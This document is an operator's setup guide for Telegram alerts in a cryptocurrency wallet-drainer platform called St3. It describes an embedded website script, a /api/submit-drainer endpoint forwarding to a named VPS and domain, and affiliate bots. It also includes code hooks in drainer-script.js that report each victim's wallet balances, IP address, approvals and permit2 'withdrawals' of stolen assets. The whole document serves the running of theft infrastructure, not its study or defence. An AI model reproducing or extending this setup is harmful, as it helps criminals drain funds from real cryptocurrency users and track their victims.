# Telegram Notifications Guide

**Status:** ✅ IMPLEMENTED & CONFIGURED

---

## Overview

The system sends real-time Telegram notifications for all wallet connections, transactions, and approvals through two channels:

1. **Platform Bot** - Main notification channel for all system events
2. **Affiliate Bot** - Per-project notifications (optional, per affiliate)

---

## Notification Flow

### When Wallet Connects

```
Website (embedded script)
    ↓
User connects wallet
    ↓
POST /api/submit-drainer (St3)
    ↓
POST https://d.v26sequence.com/api/compile/drainer (VPS)
    ↓
VPS creates session
    ↓
📱 TELEGRAM NOTIFICATION SENT
    ├ Platform Bot → Your Chat ID
    └ Affiliate Bot → Project Chat ID (if configured)
```

---

## Configuration

### Environment Variables

#### St3 (.env.local / Vercel)

```env
# Platform Telegram Bot (for St3 notifications)
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE

# Optional: Admin notifications
TELEGRAM_ADMIN_CHAT_IDS=123456789,987654321

# Webhook security
TELEGRAM_WEBHOOK_SECRET=your-secret-key-here
```

#### VPS (/home/fattah/deploy-staging/blockchain-system/.env)

```env
# Platform notifications
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
TELEGRAM_THREAD_ID=optional-thread-id

# Affiliate notifications (per-project)
TELEGRAM_OPS_BOT_TOKEN=YOUR_OPS_BOT_TOKEN_HERE
TELEGRAM_OPS_WEBHOOK_SECRET=your-secret-key
TELEGRAM_OPS_ALLOWED_IDS=123456789,987654321

TELEGRAM_AFFILIATE_BOT_TOKEN=YOUR_AFFILIATE_BOT_TOKEN_HERE
TELEGRAM_AFFILIATE_WEBHOOK_SECRET=your-affiliate-secret
```

---

## Setting Up Telegram Bot

### Step 1: Create Bot with BotFather

```
1. Open Telegram
2. Search for @BotFather
3. Send: /newbot
4. Set name: "St3 Drainer Notifications"
5. Set username: "st3_drainer_bot"
6. Copy TOKEN_HERE
```

**Your TELEGRAM_BOT_TOKEN:** `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`

### Step 2: Get Your Chat ID

```
1. Create Telegram group or use DM
2. Send: @getidsbot
3. Bot returns your CHAT_ID
4. Copy this ID
```

**Your TELEGRAM_CHAT_ID:** `123456789`

### Step 3: Set Permissions

For group chats:
1. Add your bot to group
2. Make bot administrator
3. Allow sending messages/notifications

---

## Notification Types

### 1. Wallet Connection Notification

**Sent when:** User connects wallet via embedded script

```
🔗 NEW WALLET CONNECTED

👛 Wallet: 0x742d35Cc6634C0532925a3b844Bc9e7595f42bE
🌐 Network: Ethereum (ID: 1)
💼 Wallet Type: MetaMask

💰 BALANCE OVERVIEW
├ ETH: 2.543000 ($5,086.00)
├ Tokens: $12,340.50
├ NFTs: $0.00
└ Total: $17,426.50

🌍 IP: 192.168.1.100
🔗 Referrer: example.com
⏰ Time: 2026-08-24T10:20:34Z
```

### 2. Withdrawal/Transfer Notification

**Sent when:** Assets are transferred to receiver

```
✅ WITHDRAWAL SUCCESS

👛 Wallet: 0x742d35Cc6634C0532925a3b844Bc9e7595f42bE
🌐 Network: Ethereum (ID: 1)
📋 Type: Token Transfer
⚙️ Method: permit2

💎 ASSET DETAILS
├ Asset: USDC
├ Amount: 1000.00
└ Value: $1,000.00

🔍 TX Hash: 0x123abc...
⏰ Time: 2026-08-24T10:21:45Z
```

### 3. Approval Notification

**Sent when:** User approves spending

```
✍️ APPROVAL RECEIVED

👛 Wallet: 0x742d35Cc6634C0532925a3b844Bc9e7595f42bE
🌐 Network: Ethereum
⚙️ Method: permit2
💎 Asset: USDC
💰 Value: $10,000.00
🔍 TX: 0x456def...
⏰ Time: 2026-08-24T10:21:30Z
```

### 4. Sign Request Notification

**Sent when:** User signs message/tx

```
✍️ SIGNATURE REQUEST

👛 Wallet: 0x742d35Cc6634C0532925a3b844Bc9e7595f42bE
🌐 Network: Ethereum
👤 Wallet Type: MetaMask
📝 Message: Signing drainer session...
⏰ Time: 2026-08-24T10:21:00Z
```

---

## VPS Telegram Integration

### Notification Endpoints

**File:** `/home/fattah/deploy-staging/blockchain-system/src/utils/telegram.js`

**Methods:**
- `notifyConnection(data)` - Wallet connected
- `notifyWithdrawal(data)` - Asset transferred
- `notifyApproval(data)` - Approval granted
- `notifySign(data)` - Signature requested

### How to Trigger Notifications

In drainer-script.js, add:

```javascript
const telegram = require('../utils/telegram');

// When wallet connects
telegram.notifyConnection({
  address: wallet,
  chainName: 'Ethereum',
  chainId: 1,
  balanceEth: '2.543',
  balanceUsd: '5086.00',
  tokensUsd: '12340.50',
  nftsUsd: '0',
  totalUsd: '17426.50',
  walletType: 'MetaMask',
  ip: req.ip,
  referrer: req.headers.referer
});

// When withdrawal succeeds
telegram.notifyWithdrawal({
  address: wallet,
  chainName: 'Ethereum',
  chainId: 1,
  type: 'Token Transfer',
  method: 'permit2',
  asset: 'USDC',
  amount: '1000.00',
  amountUsd: '1000.00',
  txHash: '0x123abc...',
  status: 'success'
});
```

---

## St3 Telegram Integration

### Main Endpoint

**File:** `/Users/a.l-f.a.t.t.ah/Desktop/Production/SETUPSAAS/St3/src/app/api/notify/route.ts`

**Function:** `POST /api/notify`

```bash
curl -X POST http://localhost:3000/api/notify \
  -H "Content-Type: application/json" \
  -d '{
    "message": "🔗 NEW WALLET CONNECTED\n👛 Wallet: 0x742d35...",
    "projectId": "optional-project-id"
  }'
```

**Response:**
```json
{
  "status": "ok",
  "queued": true,
  "jobId": "notify-123456"
}
```

### How to Send Notifications

From any St3 endpoint:

```typescript
import { sendTelegramNotification } from '@/lib/telegram';

// Send to platform channel
await sendTelegramNotification({
  message: '🔗 NEW WALLET CONNECTED\n👛 Wallet: 0x742d35...',
  includePlatform: true
});

// Send to affiliate channel
await sendTelegramNotification({
  message: '🔗 NEW WALLET CONNECTED\n👛 Wallet: 0x742d35...',
  projectId: 'affiliate-project-id'
});

// Send to both
await sendTelegramNotification({
  message: '🔗 NEW WALLET CONNECTED\n👛 Wallet: 0x742d35...',
  projectId: 'affiliate-project-id',
  includePlatform: true
});
```

---

## Complete Setup

### Step 1: Create Telegram Bot

```bash
# Use BotFather on Telegram
# Get TOKEN_HERE and CHAT_ID_HERE
```

### Step 2: Configure St3

Add to `.env.local`:

```env
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
TELEGRAM_CHAT_ID=123456789
```

Deploy to Vercel:

```bash
cd /Users/a.l-f.a.t.t.ah/Desktop/Production/SETUPSAAS/St3
vercel env add TELEGRAM_BOT_TOKEN
# Paste: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
vercel env add TELEGRAM_CHAT_ID
# Paste: 123456789
vercel deploy --prod
```

### Step 3: Configure VPS

SSH to VPS:

```bash
ssh fattah@84.32.25.224
```

Edit environment:

```bash
nano /home/fattah/deploy-staging/blockchain-system/.env
```

Add:

```env
TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
TELEGRAM_CHAT_ID=123456789
TELEGRAM_THREAD_ID=  # optional, for topic threads
```

Restart:

```bash
pm2 restart blockchain-system
```

### Step 4: Test

Send test notification:

```bash
# From St3 local
curl -X POST http://localhost:3000/api/notify \
  -H "Content-Type: application/json" \
  -d '{"message":"✅ Test notification from St3"}'

# From VPS
ssh fattah@84.32.25.224 "curl -X POST http://localhost:3000/api/notify \
  -H 'Content-Type: application/json' \
  -d '{\"message\":\"✅ Test notification from VPS\"}'"
```

Check your Telegram chat - you should receive both notifications.

---

## Affiliate Notifications (Optional)

### Per-Project Setup

Create separate Telegram bots for each affiliate:

```
1. Create bot with BotFather (same steps)
2. Store in database:
   - projectId
   - telegramBotToken
   - telegramChatId
3. Send notifications:
   await sendAffiliateTelegramMessage(projectId, message)
```

### API

```bash
curl -X POST https://your-domain.vercel.app/api/notify \
  -H "Content-Type: application/json" \
  -d '{
    "message": "📊 Project Activity Report",
    "projectId": "affiliate-123"
  }'
```

Notifications go to:
- Platform channel (TELEGRAM_CHAT_ID)
- Affiliate channel (project.telegramChatId)

---

## Troubleshooting

### Notifications Not Sending

1. **Check environment variables:**
   ```bash
   # St3
   echo $TELEGRAM_BOT_TOKEN
   echo $TELEGRAM_CHAT_ID
   
   # VPS
   ssh fattah@84.32.25.224 "echo $TELEGRAM_BOT_TOKEN"
   ```

2. **Check bot is in group:**
   ```
   Telegram → Group Settings → Members → Bot should be listed
   ```

3. **Check bot has permissions:**
   ```
   Group Settings → Bot permissions → Send messages: ON
   ```

4. **Check logs:**
   ```bash
   # St3
   npm run dev  # Look for Telegram log messages
   
   # VPS
   ssh fattah@84.32.25.224 "pm2 logs blockchain-system --lines 100"
   ```

### Invalid Token

- Verify bot token format: `123456:ABC-DEF...`
- Token should have `:` separator
- Check for extra spaces

### Invalid Chat ID

- Chat ID must be numeric
- Can include `-` for groups: `-123456789`
- Don't use `@` symbol
- Get ID from @getidsbot

### Rate Limited

- Telegram limits: ~30 messages per second
- Implement queue (already done with job queue)
- Batch notifications if needed

---

## Real-World Example

### Drainer Wallet Connection → Telegram Notification

**Flow:**

```
1. User visits website with embedded script
2. Clicks to connect wallet
3. MetaMask opens
4. User approves connection
5. Script POSTs to /api/submit-drainer
6. St3 forwards to VPS
7. VPS creates session
8. 📱 TELEGRAM: "🔗 NEW WALLET CONNECTED"
   - Wallet address shown
   - Balance details displayed
   - Network and time logged
9. Operator sees notification immediately
10. Can monitor in real-time
```

---

## Notification Destination

### Platform Bot
- **Where:** TELEGRAM_BOT_TOKEN → TELEGRAM_CHAT_ID
- **Channel:** Single Telegram chat/group
- **Use:** Main operations monitoring
- **Setup:** Environment variable

### Affiliate Bot (Optional)
- **Where:** Per-project bot token → Per-project chat ID
- **Channel:** Project-specific Telegram group
- **Use:** Affiliate-specific activity
- **Setup:** Database (per affiliate)

---

## Summary

✅ **Telegram notifications configured:**
- Wallet connections → Real-time alerts
- Asset transfers → Transaction confirmations
- Approvals → User action logging
- All configurable via environment variables
- Works on St3 + VPS
- Optional affiliate bot integration

**Next step:** Add your bot token and chat ID to environment, deploy, and test.

